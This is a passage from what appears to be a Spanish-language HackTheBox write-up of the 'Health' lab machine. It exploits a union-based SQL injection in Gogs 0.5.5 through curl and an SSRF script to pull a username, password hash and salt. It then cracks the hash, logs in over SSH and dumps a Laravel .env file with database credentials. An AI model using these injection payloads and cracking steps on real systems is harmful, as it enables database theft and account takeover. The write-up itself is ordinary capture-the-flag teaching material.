+    &lt;ul class="menu menu-line container" id="header-nav"&gt;
+
+
+
+
+            &lt;li class="right" id="header-nav-help"&gt;
+                &lt;a target="_blank" href="http://gogs.io/docs"&gt;&lt;i class="octicon octicon-info"&gt;&lt;/i&gt;  Help&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class="right" id="header-nav-explore"&gt;
+                &lt;a href="/explore"&gt;&lt;i class="octicon octicon-globe"&gt;&lt;/i&gt;  Explore&lt;/a&gt;
+            &lt;/li&gt;
+
+
+    &lt;/ul&gt;
+&lt;/header&gt;
+&lt;div id="promo-wrapper"&gt;
+    &lt;div class="container clear"&gt;
+        &lt;div id="promo-logo" class="left"&gt;
+            &lt;img src="/img/gogs-lg.png" alt="logo" /&gt;
+        &lt;/div&gt;
+        &lt;div id="promo-content"&gt;
+            &lt;h1&gt;Gogs&lt;/h1&gt;
+            &lt;h2&gt;A painless self-hosted Git service written in Go&lt;/h2&gt;
+            &lt;form id="promo-form" action="/user/login" method="post"&gt;
+                &lt;input type="hidden" name="_csrf" value="WJDAc67LtowFFe9KpcEtGx_rfP86MTY3MzA3MTYzNDIzNTk3MzY3NQ=="&gt;
+                &lt;input class="ipt ipt-large" id="username" name="uname" type="text" placeholder="Username or E-mail"/&gt;
+                &lt;input class="ipt ipt-large" name="password" type="password" placeholder="Password"/&gt;
+                &lt;input name="from" type="hidden" value="home"&gt;
+                &lt;button class="btn btn-black btn-large"&gt;Sign In&lt;/button&gt;
+                &lt;button class="btn btn-green btn-large" id="register-button"&gt;Register&lt;/button&gt;
+            &lt;/form&gt;
+            &lt;div id="promo-social" class="social-buttons"&gt;
+
+
+
+
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id="feature-wrapper"&gt;
+    &lt;div class="container clear"&gt;
+
+        &lt;div class="grid-1-2 left"&gt;
+            &lt;i class="octicon octicon-flame"&gt;&lt;/i&gt;
+            &lt;b&gt;Easy to install&lt;/b&gt;
+            &lt;p&gt;Simply &lt;a target="_blank" href="http://gogs.io/docs/installation/install_from_binary.html"&gt;run the binary&lt;/a&gt; for your platform. Or ship Gogs with &lt;a target="_blank" href="https://github.com/gogits/gogs/tree/master/dockerfiles"&gt;Docker&lt;/a&gt; or &lt;a target="_blank" href="https://github.com/geerlingguy/ansible-vagrant-examples/tree/master/gogs"&gt;Vagrant&lt;/a&gt;, or get it &lt;a target="_blank" href="http://gogs.io/docs/installation/install_from_packages.html"&gt;packaged&lt;/a&gt;.&lt;/p&gt;  
+        &lt;/div&gt;
+        &lt;div class="grid-1-2 left"&gt;
+            &lt;i class="octicon octicon-device-desktop"&gt;&lt;/i&gt;
+            &lt;b&gt;Cross-platform&lt;/b&gt;
+            &lt;p&gt;Gogs runs anywhere &lt;a target="_blank" href="http://golang.org/"&gt;Go&lt;/a&gt; can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;div class="grid-1-2 left"&gt;
+            &lt;i class="octicon octicon-rocket"&gt;&lt;/i&gt;
+            &lt;b&gt;Lightweight&lt;/b&gt;
+            &lt;p&gt;Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;div class="grid-1-2 left"&gt;
+            &lt;i class="octicon octicon-code"&gt;&lt;/i&gt;
+            &lt;b&gt;Open Source&lt;/b&gt;
+            &lt;p&gt;It's all on &lt;a target="_blank" href="https://github.com/gogits/gogs/"&gt;GitHub&lt;/a&gt;! Join us by contributing to make this project even better. Don't be shy to be a contributor!&lt;/p&gt;
+        &lt;/div&gt;
+
+    &lt;/div&gt;
+&lt;/div&gt;
+                &lt;/div&gt;
+                &lt;footer id="footer"&gt;
+                    &lt;div class="container clear"&gt;
+                        &lt;p class="left" id="footer-rights"&gt;© 2014 GoGits · Version: 0.5.5.1010 Beta · Page: &lt;strong&gt;1ms&lt;/strong&gt; ·
+                            Template: &lt;strong&gt;1ms&lt;/strong&gt;&lt;/p&gt;
+
+                        &lt;div class="right" id="footer-links"&gt;
+                            &lt;a target="_blank" href="https://github.com/gogits/gogs"&gt;&lt;i class="fa fa-github-square"&gt;&lt;/i&gt;&lt;/a&gt;
+                            &lt;a target="_blank" href="https://twitter.com/gogitservice"&gt;&lt;i class="fa fa-twitter"&gt;&lt;/i&gt;&lt;/a&gt;
+                            &lt;a target="_blank" href="https://plus.google.com/communities/115599856376145964459"&gt;&lt;i class="fa fa-google-plus"&gt;&lt;/i&gt;&lt;/a&gt;
+                            &lt;a target="_blank" href="http://weibo.com/gogschina"&gt;&lt;i class="fa fa-weibo"&gt;&lt;/i&gt;&lt;/a&gt;
+                            &lt;div id="footer-lang" class="inline drop drop-top"&gt;Language
+                                &lt;div class="drop-down"&gt;
+                                    &lt;ul class="menu menu-vertical switching-list"&gt;
+
+                                        &lt;li&gt;&lt;a href="#"&gt;English&lt;/a&gt;&lt;/li&gt;
+
+                                        &lt;li&gt;&lt;a href="/?lang=zh-CN"&gt;简体中文&lt;/a&gt;&lt;/li&gt;
+
+                                        &lt;li&gt;&lt;a href="/?lang=zh-HK"&gt;繁體中文&lt;/a&gt;&lt;/li&gt;
+
+                                        &lt;li&gt;&lt;a href="/?lang=de-DE"&gt;Deutsch&lt;/a&gt;&lt;/li&gt;
+
+                                        &lt;li&gt;&lt;a href="/?lang=fr-CA"&gt;Français&lt;/a&gt;&lt;/li&gt;
+
+                                        &lt;li&gt;&lt;a href="/?lang=nl-NL"&gt;Nederlands&lt;/a&gt;&lt;/li&gt;
+
+                                    &lt;/ul&gt;
+                                &lt;/div&gt;
+                            &lt;/div&gt;
+                            &lt;a target="_blank" href="http://gogs.io"&gt;Website&lt;/a&gt;
+                            &lt;span class="version"&gt;Go1.3.2&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/footer&gt;
+        &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>Se trata de <a href="https://github.com/gogs/gogs">Gogs</a> versión 0.5.5.1010 Beta. Podemos encontrar algunos <em>exploits</em> para Gogs en <code>searchsploit</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> gogs
+------------------------------------------ ----------------------------  
+Exploit Title                             | Path
+------------------------------------------ ----------------------------
+<span class="code-red">Gogs</span> - 'label' SQL Injection              | multiple/webapps/35237.txt
+<span class="code-red">Gogs</span> - 'users'/'repos' '?q' SQL Injection | multiple/webapps/35238.txt
+------------------------------------------ ----------------------------
+Shellcodes: No Results
+</code></pre></div><h3 id="configuración-de-gogs">Configuración de Gogs</h3><p>Ambos <em>exploits</em> son ataques de inyección SQL, aunque el <a href="https://www.exploit-db.com/exploits/35238">segundo <em>exploit</em></a> parece más prometedor debido a que el resultado de la consulta se muestra en la respuesta (<em>Union-based</em>).</p><p>Como <a href="https://github.com/gogs/gogs">Gogs</a> es <em>open-source</em>, podemos descargar la <a href="https://github.com/gogs/gogs/releases/tag/v0.5.5">versión vulnerable</a> y encontrar un <em>payload</em> adecuado.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q https://github.com/gogs/gogs/releases/download/v0.5.5/linux_amd64.zip  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">unzip</span> <span class="mtku">linux_amd64.zip</span>
+Archive:  linux_amd64.zip
+   creating: gogs/
+...
+
+<span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">gogs</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">./gogs</span>
+NAME:
+   Gogs - Go Git Service
+
+USAGE:
+   Gogs [global options] command [command options] [arguments...]
+
+VERSION:
+   0.5.5.1010 Beta
+
+COMMANDS:
+   web          Start Gogs web server
+   serv         This command should only be called by SSH shell
+   update       This command should only be called by SSH shell
+   fix          This command for upgrade from old version
+   dump         Dump Gogs files and database
+   cert         Generate self-signed certificate
+   help, h      Shows a list of commands or help for one command
+
+GLOBAL OPTIONS:
+   --help, -h           show help
+   --version, -v        print the version
+</code></pre></div><p>En primer lugar, hay que ir a <code>/install</code> para empezar:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./gogs</span> web
+<span class="code-yellow">[W] No custom 'conf/app.ini' found, please go to '/install'</span>  
+<span class="code-cyan">[T] Custom path: ./gogs/custom</span>
+<span class="code-cyan">[T] Log path: ./gogs/log</span>
+<span class="code-green">[I] Gogs: Go Git Service 0.5.5.1010 Beta</span>
+<span class="code-green">[I] Log Mode: Console(Trace)</span>
+<span class="code-green">[I] Redis Enabled</span>
+<span class="code-green">[I] Memcache Enabled</span>
+<span class="code-green">[I] Cache Service Enabled</span>
+<span class="code-green">[I] Session Service Enabled</span>
+<span class="code-green">[I] SQLite3 Enabled</span>
+<span class="code-green">[I] Run Mode: Development</span>
+<span class="code-green">[I] Listen: http://0.0.0.0:3000
+</code></pre></div><p>Aquí podemos poner una configuración cualquiera:</p><p><img src="/images/HTB/Health/Health-6.png" alt="Health 6"></p><p><img src="/images/HTB/Health/Health-7.png" alt="Health 7"></p><p><img src="/images/HTB/Health/Health-8.png" alt="Health 8"></p><p>Veremos algo como lo siguiente en el registro del servidor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">[T] Custom path: ./gogs/custom</span>
+<span class="code-cyan">[T] Log path: ./gogs/log</span>
+<span class="code-green">[I] Gogs: Go Git Service 0.5.5.1010 Beta</span>
+<span class="code-green">[I] Log Mode: File(Trace)</span>
+<span class="code-green">[I] Redis Enabled</span>
+<span class="code-green">[I] Memcache Enabled</span>
+<span class="code-green">[I] Cache Service Enabled</span>
+<span class="code-green">[I] Session Service Enabled</span>
+<span class="code-green">[I] Git user.name and user.email set to Gogs &lt;gogitservice@gmail.com&gt;</span>  
+<span class="code-green">[I] SQLite3 Enabled</span>
+<span class="code-green">[I] Run Mode: Production</span>
+<span class="code-green">[I] First-time run install finished!</span>
+[Macaron] Completed /install 302 Found in 98.513698ms
+[Macaron] Started GET /user/login for 127.0.0.1
+[Macaron] <span class="code-green">Completed /user/login 200 OK in 6.322729ms
+</code></pre></div><h3 id="explotación-de-gogs">Explotación de Gogs</h3><p>Como estaremos explotando un SQLi, vamos a ver qué campos nos interesan:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlite3</span> <span class="mtku">data/gogs.db</span>
+SQLite version 3.31.1
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+access        hook_task     milestone     public_key    team_user
+action        issue         mirror        release       update_task
+attachment    issue_user    notice        repository    user
+comment       label         oauth2        star          watch
+follow        login_source  org_user      team          webhook
+sqlite&gt; .header on
+sqlite&gt; select * from user;
+id|lower_name|name|full_name|email|passwd|login_type|login_source|login_name|type|num_followers|num_followings|num_stars|num_repos|avatar|avatar_email|location|website|is_active|is_admin|rands|salt|created|updated|description|num_teams|num_members
+1|rocky|rocky||rocky@rocky.com|e901286315921f96991d121dbd0e202fec6fb94715e8def4a4e6ff7f54e708c9634e0c21228470f8fb7847483eafbf077f5a|0|0||0|0|0|0|0|1d9f758b9a472ea82604828e5fa387a6|rocky@rocky.com|||1|1|Bzo2RqEmGh|ZGZFz0J50V|yyyy-mm-dd hh:mm:ss|yyyy-mm-dd hh:mm:ss||0|0  
+</code></pre></div><p>Los campos interesantes son <code>user.name</code>, <code>user.passwd</code> y <code>user.salt</code>.</p><p>La vulnerabilidad de SQLi existe en <code>/api/v1/repos/search</code> y <code>/api/v1/users/search</code>, según <a href="https://www.exploit-db.com/exploits/35238">www.exploit-db.com</a>. Aquí tenemos una prueba de concepto de que <code>/api/v1/users/search</code> es vulnerable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://127.0.0.1:3000/api/v1/users/search?q='"</span>  
+{
+  "error": "unrecognized token: \"') LIMIT 10\"",
+  "ok": false
+}
+</code></pre></div><p>En <a href="https://www.exploit-db.com/exploits/35238">www.exploit-db.com</a> aparece este <em>payload</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Proof of Concept
+================
+Request:
+http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/mysql.db/**/where/**/('%25'%3D'  
+
+Response:
+{"data":[{"username":"5.5.40-0ubuntu0.14.04.1","avatar":"//1.gravatar.com/avatar/"}],"ok":true}
+</code></pre></div><p>Tenemos que cambiar un poco la sintaxis porque el servidor usa SQLite3 en lugar de MySQL (en local). En resumen, podemos usar estas peticiones para obtener los campos que queremos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-magenta">$(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">"http://127.0.0.1:3000/api/v1/users/search?q=%27 AND 0) UNION ALL SELECT null,null,name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM user WHERE (%27%25%27%3d%27"</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/ /\/**\//g'</span><span class="code-dark-magenta">)</span>
+{
+  "data": [
+    {
+      "username": "rocky",
+      "avatar": "//1.gravatar.com/avatar/"
+    }
+  ],
+  "ok": true
+}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-magenta">$(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">"http://127.0.0.1:3000/api/v1/users/search?q=%27 AND 0) UNION ALL SELECT null,null,passwd,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM user WHERE (%27%25%27%3d%27"</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/ /\/**\//g'</span><span class="code-dark-magenta">)</span>  
+{
+  "data": [
+    {
+      "username": "e901286315921f96991d121dbd0e202fec6fb94715e8def4a4e6ff7f54e708c9634e0c21228470f8fb7847483eafbf077f5a",
+      "avatar": "//1.gravatar.com/avatar/"
+    }
+  ],
+  "ok": true
+}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -s <span class="code-dark-magenta">$(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">"http://127.0.0.1:3000/api/v1/users/search?q=%27 AND 0) UNION ALL SELECT null,null,salt,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM user WHERE (%27%25%27%3d%27"</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/ /\/**\//g'</span><span class="code-dark-magenta">)</span>
+{
+  "data": [
+    {
+      "username": "ZGZFz0J50V",
+      "avatar": "//1.gravatar.com/avatar/"
+    }
+  ],
+  "ok": true
+}
+</code></pre></div><p>Como las anteriores son peticiones GET, podemos emplear el ataque de SSRF para redirigir al cliente web a <code>http://127.0.0.1:3000/api/v1/users/search?q=...</code> y obtener los valores de la base de datos remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">ssrf.py</span> 10.10.17.44 <span class="code-dark-magenta">$(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">"http://127.0.0.1:3000/api/v1/users/search?q=%27 AND 0) UNION ALL SELECT null,null,name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM user WHERE (%27%25%27%3d%27"</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/ /\/**\//g'</span><span class="code-dark-magenta">)</span>
+ * Serving Flask app 'ssrf'
+ * Debug mode: off
+
+[+] SSRF Response:
+
+{"data":[{"username":"susanne","avatar":"//1.gravatar.com/avatar/"}],"ok":true}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">ssrf.py</span> 10.10.17.44 <span class="code-dark-magenta">$(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">"http://127.0.0.1:3000/api/v1/users/search?q=%27 AND 0) UNION ALL SELECT null,null,passwd,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM user WHERE (%27%25%27%3d%27"</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/ /\/**\//g'</span><span class="code-dark-magenta">)</span>  
+ * Serving Flask app 'ssrf'
+ * Debug mode: off
+
+[+] SSRF Response:
+
+{"data":[{"username":"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37","avatar":"//1.gravatar.com/avatar/"}],"ok":true}
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">ssrf.py</span> 10.10.17.44 <span class="code-dark-magenta">$(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">"http://127.0.0.1:3000/api/v1/users/search?q=%27 AND 0) UNION ALL SELECT null,null,salt,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM user WHERE (%27%25%27%3d%27"</span> | <span class="code-dark-green">sed</span> <span class="code-dark-yellow">'s/ /\/**\//g'</span><span class="code-dark-magenta">)</span>
+ * Serving Flask app 'ssrf'
+ * Debug mode: off
+
+[+] SSRF Response:
+
+{"data":[{"username":"sO3XIbeW14","avatar":"//1.gravatar.com/avatar/"}],"ok":true}
+</code></pre></div><h3 id="rompiendo-el-_hash_">Rompiendo el <em>hash</em></h3><p>En este punto, podemos tratar de romper el <em>hash</em>. Para ello, vamos a usar GitHub para encontrar el método:</p><p><img src="/images/HTB/Health/Health-9.png" alt="Health 9"></p><p>Como Gogs está programado en Go, vamos a escribir otro programa en Go llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Health/crack.go"><code>crack.go</code></a> con las mismas funciones para romper el <em>hash</em> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Health#crackgo">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">go</span> mod init crack
+go: creating new go.mod: module crack
+go: to add module requirements and sums:
+        go mod tidy
+
+<span class="code-cyan">$</span> <span class="code-dark-green">go</span> mod tidy
+go: finding module for package golang.org/x/crypto/pbkdf2
+go: found golang.org/x/crypto/pbkdf2 in golang.org/x/crypto v0.5.0
+
+<span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">crack.go</span>
+Usage: go run crack.go &lt;wordlist&gt; &lt;hash&gt; &lt;salt&gt;
+exit status 1
+
+<span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">crack.go</span> $WORDLISTS/rockyou.txt 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37 sO3XIbeW14  
+[+] Cracked: february15
+</code></pre></div><p>Y esta contraseña (<code>february15</code>) se reutiliza en SSH por el usuario <code>sussane</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> susanne@10.10.11.176
+susanne@10.10.11.176's password:  
+<span class="code-green">susanne@health</span>:<span class="code-blue">~</span>$ cat user.txt
+e7a9065c5c30e2f82c57de556c798eed
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Después de la enumeración de permisos básica, podemos echar un vistazo al código fuente del servidor web:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">susanne@health</span>:<span class="code-blue">~</span>$ cd /var/www/html
+<span class="code-green">susanne@health</span>:<span class="code-blue">/var/www/html</span>$ ll
+total 412
+drwxr-xr-x  14 www-data www-data   4096 Jul 26 10:12 <span class="code-blue">.</span>/
+drwxr-xr-x   3 www-data www-data   4096 May 17  2022 <span class="code-blue">..</span>/
+drwxrwxr-x   9 www-data www-data   4096 Jul 26 10:12 <span class="code-blue">app</span>/
+-rwxr-xr-x   1 www-data www-data   1686 May 17  2022 <span class="code-green">artisan</span>*
+drwxrwxr-x   3 www-data www-data   4096 Jul 26 10:12 <span class="code-blue">bootstrap</span>/
+-rw-r--r--   1 www-data www-data   1775 May 17  2022 composer.json
+-rw-r--r--   1 www-data www-data 292429 May 17  2022 composer.lock
+drwxrwxr-x   2 www-data www-data   4096 May 17  2022 <span class="code-blue">config</span>/
+drwxrwxr-x   5 www-data www-data   4096 May 17  2022 <span class="code-blue">database</span>/
+-rw-r--r--   1 www-data www-data    258 May 17  2022 .editorconfig
+-rw-r--r--   1 www-data www-data    978 May 17  2022 .env
+-rw-r--r--   1 www-data www-data    899 May 17  2022 .env.example
+drwxrwxr-x   8 www-data www-data   4096 Jul 26 10:12 <span class="code-blue">.git</span>/
+-rw-r--r--   1 www-data www-data    152 May 17  2022 .gitattributes  
+-rw-r--r--   1 www-data www-data    207 May 17  2022 .gitignore
+drwxrwxr-x 507 www-data www-data  20480 Jul 26 10:12 <span class="code-blue">node_modules</span>/
+-rw-r--r--   1 www-data www-data    643 May 17  2022 package.json
+-rw-r--r--   1 www-data www-data   1202 May 17  2022 phpunit.xml
+drwxrwxr-x   4 www-data www-data   4096 Jul 26 10:12 <span class="code-blue">public</span>/
+-rw-r--r--   1 www-data www-data   3958 May 17  2022 README.md
+drwxrwxr-x   7 www-data www-data   4096 Jul 26 10:12 <span class="code-blue">resources</span>/
+drwxrwxr-x   2 www-data www-data   4096 May 17  2022 <span class="code-blue">routes</span>/
+-rw-r--r--   1 www-data www-data    569 May 17  2022 server.php
+drwxrwxr-x   5 www-data www-data   4096 May 17  2022 <span class="code-blue">storage</span>/
+-rw-r--r--   1 www-data www-data    194 May 17  2022 .styleci.yml
+drwxrwxr-x   4 www-data www-data   4096 May 17  2022 <span class="code-blue">tests</span>/
+drwxrwxr-x  44 www-data www-data   4096 Jul 26 10:12 <span class="code-blue">vendor</span>/
+-rw-r--r--   1 www-data www-data    556 May 17  2022 webpack.mix.js
+</code></pre></div><p>En <code>.env</code> encontramos las credenciales de MySQL (<code>laravel:MYsql_strongestpass@2014+</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">susanne@health</span>:<span class="code-blue">/var/www/html</span>$ cat .env
+APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=base64:x12LE6h+TU6x4gNKZIyBOmthalsPLPLv/Bf/MJfGbzY=  
+APP_DEBUG=true
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+LOG_DEPRECATIONS_CHANNEL=null
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=laravel
+DB_USERNAME=laravel
+DB_PASSWORD=MYsql_strongestpass@2014+
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+FILESYSTEM_DRIVER=local
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+
+MEMCACHED_HOST=127.0.0.1
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_MAILER=smtp
+MAIL_HOST=mailhog
+MAIL_PORT=1025
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+MAIL_FROM_ADDRESS=null
+MAIL_FROM_NAME="${APP_NAME}"
+
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_DEFAULT_REGION=us-east-1
+AWS_BUCKET=
+AWS_USE_PATH_STYLE_ENDPOINT=false
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+</code></pre></div><h3 id="análisis-de-código-fuente">Análisis de código fuente</h3><p>Esto es <code>routes/web.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">susanne@health</span>:<span class="code-blue">/var/www/html</span>$ cat routes/web.php
+&lt;?php
+
+use Illuminate\Support\Facades\Route;
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the "web" middleware group. Now create something great!
+|
+*/
+
+Route::get('/', function () {
+    return view('index');
+});
+
+Route::get('/webhook/{id}', function ($id) {
+    $webhook = \App\Models\Task::find($id);
+
+    error_log($webhook);
+
+    if ($webhook) {
+        return view("view", ["webhook" =&gt; $webhook]);
+    } else {
+        return redirect('/')-&gt;with('error', 'Webhook was not found');
+    }
+})-&gt;whereUuid('id');
+
+Route::post("/webhook", [\App\Http\Controllers\TaskController::class, 'create'])-&gt;name('webhook');  
+</code></pre></div><p>Solamente hay una ruta (<code>/webhook</code>), controlada por <code>TaskController</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">susanne@health</span>:<span class="code-blue">/var/www/html</span>$ cat app/Http/Controllers/TaskController.php  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">App\Http\Controllers</span><span class="mtk1">;</span>
+
+<span class="mtk5">use</span><span class="mtk1"> App\Models\</span><span class="mtk7 mtki">Task</span><span class="mtk1">;</span>
+<span class="mtk5">use</span><span class="mtk1"> App\Rules\</span><span class="mtk7 mtki">SafeUrlRule</span><span class="mtk1">;</span>
+<span class="mtk5">use</span><span class="mtk1"> Illuminate\Http\</span><span class="mtk7 mtki">Request</span><span class="mtk1">;</span>
+
+<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">TaskController</span><span class="mtk1"> </span><span class="mtk5">extends</span><span class="mtk1"> </span><span class="mtk8 mtki mtku">Controller</span>
+<span class="mtk1">{</span>
+<span class="mtk1">    </span><span class="mtk3">/**</span>
+<span class="mtk3">     * Display a listing of the resource.</span>
+<span class="mtk3">     *</span>
+<span class="mtk3">     * </span><span class="mtk5">@return</span><span class="mtk3"> \Illuminate\Http\</span><span class="mtk7 mtki">Response</span>
+<span class="mtk3">     */</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">index</span><span class="mtk1">()</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">view</span><span class="mtk1">(</span><span class="mtk4">'create'</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk3">/**</span>
+<span class="mtk3">     * Show the form for creating a new resource.</span>
+<span class="mtk3">     *</span>
+<span class="mtk3">     * </span><span class="mtk5">@return</span><span class="mtk3"> \Illuminate\Http\</span><span class="mtk7 mtki">Response</span>
+<span class="mtk3">     */</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk7 mtki">Request</span><span class="mtk1"> $request)</span>
+<span class="mtk1">    {</span>
+
+<span class="mtk1">        $action </span><span class="mtk5">=</span><span class="mtk1"> $request</span><span class="mtk5">-&gt;</span><span class="mtk1">action;</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ($action </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"Delete"</span><span class="mtk1">) {</span>
+<span class="mtk1">            $id </span><span class="mtk5">=</span><span class="mtk1"> $request</span><span class="mtk5">-&gt;</span><span class="mtk1">id;</span>
